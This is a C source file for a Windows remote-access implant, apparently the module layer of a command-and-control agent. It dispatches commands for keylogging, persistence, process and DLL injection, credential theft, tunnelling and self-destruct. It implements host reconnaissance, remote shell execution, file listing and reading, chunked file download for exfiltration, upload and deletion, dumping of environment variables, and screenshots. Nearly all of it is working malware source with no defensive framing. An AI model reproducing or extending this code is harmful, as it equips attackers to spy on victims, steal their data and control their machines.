#include "modules.h"
#include "util.h"
#include <tlhelp32.h>

/* =========================================================================
 * JSON helpers
 * ========================================================================= */
void jesc(buf_t *b, const char *s)
{
    const unsigned char *p = (const unsigned char *)(s ? s : "");
    buf_append_str(b, "\"");
    for (; *p; p++) {
        unsigned char c = *p;
        switch (c) {
        case '"': buf_append_str(b, "\\\""); break;
        case '\\': buf_append_str(b, "\\\\"); break;
        case '\b': buf_append_str(b, "\\b"); break;
        case '\f': buf_append_str(b, "\\f"); break;
        case '\n': buf_append_str(b, "\\n"); break;
        case '\r': buf_append_str(b, "\\r"); break;
        case '\t': buf_append_str(b, "\\t"); break;
        default:
            if (c < 0x20) {
                char t[8];
                snprintf(t, sizeof(t), "\\u%04x", c);
                buf_append_str(b, t);
            } else {
                buf_append(b, &c, 1);
            }
        }
    }
    buf_append_str(b, "\"");
}

void jkey(buf_t *b, const char *k) { jesc(b, k); buf_append_str(b, ":"); }
void jstr(buf_t *b, const char *k, const char *v) { jkey(b, k); jesc(b, v ? v : ""); }
void jint(buf_t *b, const char *k, long long v) { jkey(b, k); buf_append_printf(b, "%lld", v); }
void jbool(buf_t *b, const char *k, int v) { jkey(b, k); buf_append_str(b, v ? "true" : "false"); }
void jraw(buf_t *b, const char *k, const char *raw) { jkey(b, k); buf_append_str(b, raw ? raw : "null"); }

/* =========================================================================
 * Generic utilities shared by modules
 * ========================================================================= */
static void jbool_result(buf_t *out, int ok, const char *msg)
{
    buf_append_str(out, "{");
    jbool(out, "ok", ok);
    if (msg) { buf_append_str(out, ","); jstr(out, "msg", msg); }
    buf_append_str(out, "}");
}

int c2_mod_execute(const char *module, const json *args, buf_t *result_obj, int *ok)
{
    int rc = -1;
    *ok = 0;
    buf_reset(result_obj);
    if (!module) return -1;

    if (!strcmp(module, "sysinfo"))          rc = mod_sysinfo(args, result_obj);
    else if (!strcmp(module, "shell"))       rc = mod_shell(args, result_obj);
    else if (!strcmp(module, "ps"))          rc = mod_ps(args, result_obj);
    else if (!strcmp(module, "ls"))          rc = mod_ls(args, result_obj);
    else if (!strcmp(module, "cat"))         rc = mod_cat(args, result_obj);
    else if (!strcmp(module, "download_begin")) rc = mod_download_begin(args, result_obj);
    else if (!strcmp(module, "download_chunk")) rc = mod_download_chunk(args, result_obj);
    else if (!strcmp(module, "upload"))      rc = mod_upload(args, result_obj);
    else if (!strcmp(module, "rm"))          rc = mod_rm(args, result_obj);
    else if (!strcmp(module, "mv"))          rc = mod_mv(args, result_obj);
    else if (!strcmp(module, "mkdir"))       rc = mod_mkdir(args, result_obj);
    else if (!strcmp(module, "sleep"))       rc = mod_sleep(args, result_obj);
    else if (!strcmp(module, "screenshot"))  rc = mod_screenshot(args, result_obj);
    else if (!strcmp(module, "keylog_start")) rc = mod_keylog_start(args, result_obj);
    else if (!strcmp(module, "keylog_stop")) rc = mod_keylog_stop(args, result_obj);
    else if (!strcmp(module, "keylog_dump")) rc = mod_keylog_dump(args, result_obj);
    else if (!strcmp(module, "guard"))       rc = mod_guard(args, result_obj);
    else if (!strcmp(module, "env"))         rc = mod_env(args, result_obj);
    else if (!strcmp(module, "persist_install")) rc = mod_persist_install(args, result_obj);
    else if (!strcmp(module, "persist_status"))  rc = mod_persist_status(args, result_obj);
    else if (!strcmp(module, "persist_disable")) rc = mod_persist_disable(args, result_obj);
    else if (!strcmp(module, "tunnel_open"))  rc = mod_tunnel_open(args, result_obj);
    else if (!strcmp(module, "tunnel_data"))  rc = mod_tunnel_data(args, result_obj);
    else if (!strcmp(module, "tunnel_close")) rc = mod_tunnel_close(args, result_obj);
    else if (!strcmp(module, "inject"))       rc = mod_inject(args, result_obj);
    else if (!strcmp(module, "inject_dll"))   rc = mod_inject_dll(args, result_obj);
    else if (!strcmp(module, "migrate"))      rc = mod_migrate(args, result_obj);
    else if (!strcmp(module, "creds"))        rc = mod_creds(args, result_obj);
    else if (!strcmp(module, "cleanup"))      rc = mod_cleanup(args, result_obj);
    else if (!strcmp(module, "selfdestruct")) rc = mod_selfdestruct(args, result_obj);
    else {
        buf_append_str(result_obj, "{");
        jbool(result_obj, "ok", 0);
        buf_append_str(result_obj, ",");
        jstr(result_obj, "error", "unknown module");
        buf_append_str(result_obj, "}");
        return -1;
    }
    if (rc == 0) *ok = 1;
    if (!result_obj->len) jbool_result(result_obj, rc == 0, NULL);
    return rc;
}

/* =========================================================================
 * Module: sysinfo
 * ========================================================================= */
typedef LONG(WINAPI *rtl_get_version_t)(PRTL_OSVERSIONINFOW);

static void get_os_version(char *out, size_t cap)
{
    RTL_OSVERSIONINFOW vi;
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    rtl_get_version_t fn = NULL;
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (nt) fn = (rtl_get_version_t)GetProcAddress(nt, "RtlGetVersion");
    if (fn) fn(&vi);
    else {
        OSVERSIONINFOW ov;
        memset(&ov, 0, sizeof(ov));
        ov.dwOSVersionInfoSize = sizeof(ov);
        GetVersionExW(&ov);
        vi.dwMajorVersion = ov.dwMajorVersion;
        vi.dwMinorVersion = ov.dwMinorVersion;
        vi.dwBuildNumber = ov.dwBuildNumber;
        vi.szCSDVersion[0] = 0;
    }
    snprintf(out, cap, "Windows %lu.%lu.%lu %ls", (unsigned long)vi.dwMajorVersion,
             (unsigned long)vi.dwMinorVersion, (unsigned long)vi.dwBuildNumber, vi.szCSDVersion);
}

static void get_primary_ip(char *out, size_t cap)
{
    IP_ADAPTER_INFO ai[32];
    DWORD sz = sizeof(ai);
    PIP_ADAPTER_INFO p;
    out[0] = 0;
    if (GetAdaptersInfo(ai, &sz) != ERROR_SUCCESS) return;
    for (p = ai; p; p = p->Next) {
        if (p->IpAddressList.IpAddress.String[0] && strcmp(p->IpAddressList.IpAddress.String, "0.0.0.0") != 0) {
            snprintf(out, cap, "%s", p->IpAddressList.IpAddress.String);
            return;
        }
    }
}

static void get_primary_mac(char *out, size_t cap)
{
    IP_ADAPTER_INFO ai[32];
    DWORD sz = sizeof(ai);
    PIP_ADAPTER_INFO p;
    out[0] = 0;
    if (GetAdaptersInfo(ai, &sz) != ERROR_SUCCESS) return;
    for (p = ai; p; p = p->Next) {
        if (p->AddressLength >= 6) {
            snprintf(out, cap, "%02x-%02x-%02x-%02x-%02x-%02x",
                     p->Address[0], p->Address[1], p->Address[2],
                     p->Address[3], p->Address[4], p->Address[5]);
            return;
        }
    }
}

static int is_admin_token(void)
{
    HANDLE tok = NULL;
    TOKEN_ELEVATION elev;
    DWORD sz = 0, is_admin = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return 0;
    if (GetTokenInformation(tok, TokenElevation, &elev, sizeof(elev), &sz)) is_admin = elev.TokenIsElevated ? 1 : 0;
    else {
        /* fallback: membership in Administrators */
        BYTE buf[1024];
        if (GetTokenInformation(tok, TokenGroups, buf, sizeof(buf), &sz)) {
            PTOKEN_GROUPS g = (PTOKEN_GROUPS)buf;
            for (DWORD i = 0; i < g->GroupCount; i++) {
                PSID sid = g->Groups[i].Sid;
                if (IsValidSid(sid)) {
                    SID_IDENTIFIER_AUTHORITY nt = { SECURITY_NT_AUTHORITY };
                    PSID admin = NULL;
                    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin)) {
                        if (EqualSid(sid, admin)) is_admin = 1;
                        FreeSid(admin);
                    }
                }
            }
        }
    }
    CloseHandle(tok);
    return is_admin;
}

int mod_sysinfo(const json *args, buf_t *out)
{
    wchar_t wbuf[512];
    DWORD n;
    char host[256] = {0}, user[256] = {0}, domain[256] = {0};
    char osv[256], ip[64], mac[64];
    SYSTEM_INFO si;
    char *exe = exe_path();
    char *edir = exe_dir();
    char *env_dom;
    (void)args;

    n = (DWORD)(sizeof(wbuf) / sizeof(wbuf[0]));
    if (GetComputerNameW(wbuf, &n)) { char *t = narrow(wbuf); snprintf(host, sizeof(host), "%s", t); free(t); }
    n = (DWORD)(sizeof(wbuf) / sizeof(wbuf[0]));
    if (GetUserNameW(wbuf, &n)) { char *t = narrow(wbuf); snprintf(user, sizeof(user), "%s", t); free(t); }
    env_dom = env_dup("USERDOMAIN");
    if (env_dom) { snprintf(domain, sizeof(domain), "%s", env_dom); free(env_dom); }
    get_os_version(osv, sizeof(osv));
    get_primary_ip(ip, sizeof(ip));
    get_primary_mac(mac, sizeof(mac));
    GetNativeSystemInfo(&si);

    buf_append_str(out, "{");
    jstr(out, "host", host);
    buf_append_str(out, ","); jstr(out, "user", user);
    buf_append_str(out, ","); jstr(out, "domain", domain);
    buf_append_str(out, ","); jstr(out, "os", osv);
    buf_append_str(out, ","); jint(out, "arch", (long long)si.wProcessorArchitecture);
    buf_append_str(out, ","); jint(out, "pid", (long long)GetCurrentProcessId());
    buf_append_str(out, ","); jint(out, "ppid", (long long)0);
    buf_append_str(out, ","); jstr(out, "exe", exe ? exe : "");
    buf_append_str(out, ","); jstr(out, "cwd", edir ? edir : "");
    buf_append_str(out, ","); jbool(out, "admin", is_admin_token());
    buf_append_str(out, ","); jint(out, "uptime_s", (long long)(GetTickCount64() / 1000ULL));
    buf_append_str(out, ","); jint(out, "cpus", (long long)si.dwNumberOfProcessors);
    buf_append_str(out, ","); jstr(out, "ip", ip);
    buf_append_str(out, ","); jstr(out, "mac", mac);
    buf_append_str(out, ","); jstr(out, "build", C2_BUILD_ID);
    buf_append_str(out, "}");
    free(exe);
    free(edir);
    return 0;
}

/* =========================================================================
 * Module: shell
 * ========================================================================= */
int mod_shell(const json *args, buf_t *out)
{
    const char *cmd = json_obj_str(args, "cmd", NULL);
    int timeout = (int)json_obj_int(args, "timeout_ms", 60000);
    buf_t result;
    int rc = 0, timed_out;
    const size_t cap = 4u * 1024u * 1024u;
    if (!cmd || !*cmd) {
        buf_append_str(out, "{");
        jbool(out, "ok", 0);
        buf_append_str(out, ","); jstr(out, "error", "empty cmd");
        buf_append_str(out, "}");
        return -1;
    }
    if (timeout <= 0 || timeout > 3600000) timeout = 60000;
    buf_init(&result);
    timed_out = run_cmd(cmd, &result, timeout, &rc);
    {
        int truncated = 0;
        char *b64;
        if (result.len > cap) { result.len = cap; truncated = 1; }
        b64 = b64_enc(result.data, result.len);
        buf_append_str(out, "{");
        jbool(out, "ok", 1);
        buf_append_str(out, ","); jint(out, "rc", rc);
        buf_append_str(out, ","); jbool(out, "timed_out", timed_out);
        buf_append_str(out, ","); jbool(out, "truncated", truncated);
        buf_append_str(out, ","); jint(out, "len", (long long)result.len);
        buf_append_str(out, ","); jstr(out, "out_b64", b64 ? b64 : "");
        buf_append_str(out, "}");
        free(b64);
    }
    buf_free(&result);
    return 0;
}

/* =========================================================================
 * Module: ps
 * ========================================================================= */
int mod_ps(const json *args, buf_t *out)
{
    HANDLE snap;
    PROCESSENTRY32W pe;
    int first = 1;
    int count = 0;
    (void)args;
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        buf_append_str(out, "{"); jbool(out, "ok", 0); buf_append_str(out, ","); jstr(out, "error", "snapshot failed"); buf_append_str(out, "}");
        return -1;
    }
    pe.dwSize = sizeof(pe);
    buf_append_str(out, "{\"ok\":true,\"procs\":[");
    if (Process32FirstW(snap, &pe)) {
        do {
            char *name = narrow(pe.szExeFile);
            if (!first) buf_append_str(out, ",");
            first = 0;
            buf_append_str(out, "{"); jint(out, "pid", (long long)pe.th32ProcessID);
            buf_append_str(out, ","); jint(out, "ppid", (long long)pe.th32ParentProcessID);
            buf_append_str(out, ","); jstr(out, "name", name ? name : "");
            buf_append_str(out, "}");
            free(name);
            count++;
            if (count >= 2000) break;
        } while (Process32NextW(snap, &pe));
    }
    buf_append_str(out, "]}");
    CloseHandle(snap);
    return 0;
}

/* =========================================================================
 * Module: ls
 * ========================================================================= */
int mod_ls(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", ".");
    char *pattern;
    wchar_t *wpat;
    WIN32_FIND_DATAW fd;
    HANDLE h;
    int first = 1;
    size_t plen = strlen(path);
    pattern = (char *)xmalloc(plen + 4);
    snprintf(pattern, plen + 4, "%s%s*", path, (plen && (path[plen - 1] == '\\' || path[plen - 1] == '/')) ? "" : "\\");
    wpat = widen(pattern);
    free(pattern);
    if (!wpat) return -1;
    h = FindFirstFileW(wpat, &fd);
    free(wpat);
    if (h == INVALID_HANDLE_VALUE) {
        buf_append_str(out, "{"); jbool(out, "ok", 0); buf_append_str(out, ","); jstr(out, "error", "not found"); buf_append_str(out, "}");
        return -1;
    }
    buf_append_str(out, "{\"ok\":true,\"path\":");
    jesc(out, path);
    buf_append_str(out, ",\"entries\":[");
    do {
        char *name = narrow(fd.cFileName);
        if (!strcmp(name, ".") || !strcmp(name, "..")) { free(name); continue; }
        if (!first) buf_append_str(out, ",");
        first = 0;
        buf_append_str(out, "{");
        jstr(out, "name", name);
        buf_append_str(out, ",");
        jbool(out, "dir", (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0);
        buf_append_str(out, ",");
        jint(out, "size", (long long)(((u64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow));
        buf_append_str(out, "}");
        free(name);
    } while (FindNextFileW(h, &fd));
    buf_append_str(out, "]}");
    FindClose(h);
    return 0;
}

/* =========================================================================
 * Module: cat
 * ========================================================================= */
int mod_cat(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    long long max = json_obj_int(args, "max", 1024 * 1024);
    buf_t b;
    char *b64;
    if (!path) return -1;
    if (max <= 0 || max > 32 * 1024 * 1024) max = 1024 * 1024;
    buf_init(&b);
    if (read_file(path, &b) != 0) {
        buf_free(&b);
        buf_append_str(out, "{"); jbool(out, "ok", 0); buf_append_str(out, ","); jstr(out, "error", "read failed"); buf_append_str(out, "}");
        return -1;
    }
    {
        int truncated = 0;
        if ((long long)b.len > max) { b.len = (size_t)max; truncated = 1; }
        b64 = b64_enc(b.data, b.len);
        buf_append_str(out, "{");
        jbool(out, "ok", 1);
        buf_append_str(out, ","); jint(out, "len", (long long)b.len);
        buf_append_str(out, ","); jbool(out, "truncated", truncated);
        buf_append_str(out, ","); jstr(out, "data_b64", b64 ? b64 : "");
        buf_append_str(out, "}");
        free(b64);
    }
    buf_free(&b);
    return 0;
}

/* =========================================================================
 * File download / upload
 * ========================================================================= */
int mod_download_begin(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    wchar_t *wp;
    WIN32_FILE_ATTRIBUTE_DATA fa;
    if (!path) return -1;
    wp = widen(path);
    if (!wp) return -1;
    if (!GetFileAttributesExW(wp, GetFileExInfoStandard, &fa)) {
        free(wp);
        buf_append_str(out, "{\"ok\":false,\"error\":\"stat failed\"}");
        return -1;
    }
    free(wp);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jint(out, "size", (long long)(((u64)fa.nFileSizeHigh << 32) | fa.nFileSizeLow));
    buf_append_str(out, ","); jint(out, "chunk_max", 262144);
    buf_append_str(out, "}");
    return 0;
}

int mod_download_chunk(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    long long off = json_obj_int(args, "offset", 0);
    long long len = json_obj_int(args, "len", 65536);
    HANDLE h;
    wchar_t *wp;
    LARGE_INTEGER li;
    u8 *buf;
    DWORD got = 0;
    char *b64;
    if (!path) return -1;
    if (off < 0) off = 0;
    if (len <= 0 || len > 262144) len = 65536;
    wp = widen(path);
    if (!wp) return -1;
    h = CreateFileW(wp, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    free(wp);
    if (h == INVALID_HANDLE_VALUE) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"open failed\"}");
        return -1;
    }
    li.QuadPart = off;
    SetFilePointerEx(h, li, NULL, FILE_BEGIN);
    buf = (u8 *)xmalloc((size_t)len);
    if (!ReadFile(h, buf, (DWORD)len, &got, NULL)) got = 0;
    CloseHandle(h);
    b64 = b64_enc(buf, got);
    free(buf);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jint(out, "offset", off);
    buf_append_str(out, ","); jint(out, "got", (long long)got);
    buf_append_str(out, ","); jstr(out, "data_b64", b64 ? b64 : "");
    buf_append_str(out, "}");
    free(b64);
    return 0;
}

int mod_upload(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    const char *data_b64 = json_obj_str(args, "data_b64", NULL);
    int append = json_obj_bool(args, "append", 0);
    u8 *data = NULL;
    size_t n = 0;
    int rc;
    if (!path || !data_b64) return -1;
    if (b64_dec(data_b64, &data, &n) != 0) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"bad base64\"}");
        return -1;
    }
    rc = write_file(path, data, n, append);
    free(data);
    buf_append_str(out, "{");
    jbool(out, "ok", rc == 0);
    buf_append_str(out, ","); jint(out, "written", (long long)n);
    buf_append_str(out, "}");
    return rc == 0 ? 0 : -1;
}

int mod_rm(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    wchar_t *wp;
    DWORD attr;
    int rc = 0;
    if (!path) return -1;
    wp = widen(path);
    if (!wp) return -1;
    attr = GetFileAttributesW(wp);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        free(wp);
        buf_append_str(out, "{\"ok\":false,\"error\":\"not found\"}");
        return -1;
    }
    if (attr & FILE_ATTRIBUTE_DIRECTORY) rc = RemoveDirectoryW(wp) ? 0 : -1;
    else rc = DeleteFileW(wp) ? 0 : -1;
    free(wp);
    buf_append_str(out, "{");
    jbool(out, "ok", rc == 0);
    buf_append_str(out, "}");
    return rc;
}

int mod_mv(const json *args, buf_t *out)
{
    const char *src = json_obj_str(args, "src", NULL);
    const char *dst = json_obj_str(args, "dst", NULL);
    wchar_t *ws, *wd;
    int rc;
    if (!src || !dst) return -1;
    ws = widen(src); wd = widen(dst);
    if (!ws || !wd) { free(ws); free(wd); return -1; }
    rc = MoveFileExW(ws, wd, MOVEFILE_REPLACE_EXISTING | MOVEFILE_COPY_ALLOWED) ? 0 : -1;
    free(ws); free(wd);
    buf_append_str(out, "{"); jbool(out, "ok", rc == 0); buf_append_str(out, "}");
    return rc;
}

int mod_mkdir(const json *args, buf_t *out)
{
    const char *path = json_obj_str(args, "path", NULL);
    int rc;
    if (!path) return -1;
    rc = mkdir_p(path);
    buf_append_str(out, "{"); jbool(out, "ok", rc == 0); buf_append_str(out, "}");
    return rc;
}

int mod_sleep(const json *args, buf_t *out)
{
    long long ms = json_obj_int(args, "ms", 1000);
    if (ms < 0) ms = 0;
    if (ms > 3600000) ms = 3600000;
    Sleep((DWORD)ms);
    buf_append_str(out, "{"); jbool(out, "ok", 1); buf_append_str(out, ","); jint(out, "slept_ms", ms); buf_append_str(out, "}");
    return 0;
}

int mod_env(const json *args, buf_t *out)
{
    (void)args;
    buf_append_str(out, "{\"ok\":true,\"env\":{");
    {
        int first = 1;
        LPWCH block = GetEnvironmentStringsW();
        LPWCH p = block;
        if (block) {
            while (*p) {
                char *line = narrow(p);
                char *eq = line ? strchr(line, '=') : NULL;
                if (eq && eq != line) {
                    *eq = 0;
                    if (!first) buf_append_str(out, ",");
                    first = 0;
                    jstr(out, line, eq + 1);
                }
                free(line);
                p += wcslen(p) + 1;
            }
            FreeEnvironmentStringsW(block);
        }
    }
    buf_append_str(out, "}}");
    return 0;
}

/* =========================================================================
 * Module: screenshot (BMP, no external deps)
 * ========================================================================= */
int mod_screenshot(const json *args, buf_t *out)
{
    HDC hdc = GetDC(NULL);
    int w, h;
    HDC mem;
    HBITMAP bmp;
    HGDIOBJ old;
    BITMAPINFO bi;
    u8 *pix = NULL;
    DWORD pixsz;
    buf_t file;
    char *b64;
    int y;
    (void)args;
    if (!hdc) return -1;
    w = GetDeviceCaps(hdc, HORZRES);
    h = GetDeviceCaps(hdc, VERTRES);
    if (w <= 0 || h <= 0) { ReleaseDC(NULL, hdc); return -1; }
    mem = CreateCompatibleDC(hdc);
    bmp = CreateCompatibleBitmap(hdc, w, h);
    if (!mem || !bmp) {
        if (mem) DeleteDC(mem);
        if (bmp) DeleteObject(bmp);
        ReleaseDC(NULL, hdc);
        return -1;
    }
    old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    pixsz = (DWORD)w * (DWORD)h * 4u;
    pix = (u8 *)xmalloc(pixsz);
    memset(&bi, 0, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h; /* top-down */
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    if (!GetDIBits(mem, bmp, 0, (UINT)h, pix, &bi, DIB_RGB_COLORS)) {
        free(pix); pix = NULL;
    }
    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
    if (!pix) {
        buf_append_str(out, "{\"ok\":false,\"error\":\"gdi capture failed\"}");
        return -1;
    }
    buf_init(&file);
    {
        BITMAPFILEHEADER fh;
        BITMAPINFOHEADER ih;
        DWORD datasz = (DWORD)w * (DWORD)h * 4u;
        memset(&fh, 0, sizeof(fh));
        memset(&ih, 0, sizeof(ih));
        fh.bfType = 0x4D42; /* BM */
        fh.bfOffBits = sizeof(fh) + sizeof(ih);
        fh.bfSize = fh.bfOffBits + datasz;
        ih.biSize = sizeof(ih);
        ih.biWidth = w;
        ih.biHeight = h; /* bottom-up */
        ih.biPlanes = 1;
        ih.biBitCount = 32;
        ih.biCompression = BI_RGB;
        ih.biSizeImage = datasz;
        buf_append(&file, &fh, sizeof(fh));
        buf_append(&file, &ih, sizeof(ih));
        for (y = h - 1; y >= 0; y--) {
            buf_append(&file, pix + (size_t)y * (size_t)w * 4u, (size_t)w * 4u);
        }
    }
    b64 = b64_enc(file.data, file.len);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jint(out, "width", w);
    buf_append_str(out, ","); jint(out, "height", h);
    buf_append_str(out, ","); jstr(out, "format", "bmp");
    buf_append_str(out, ","); jint(out, "size", (long long)file.len);
    buf_append_str(out, ","); jstr(out, "data_b64", b64 ? b64 : "");
    buf_append_str(out, "}");
    free(b64);
    free(pix);
    buf_free(&file);
    return 0;
}
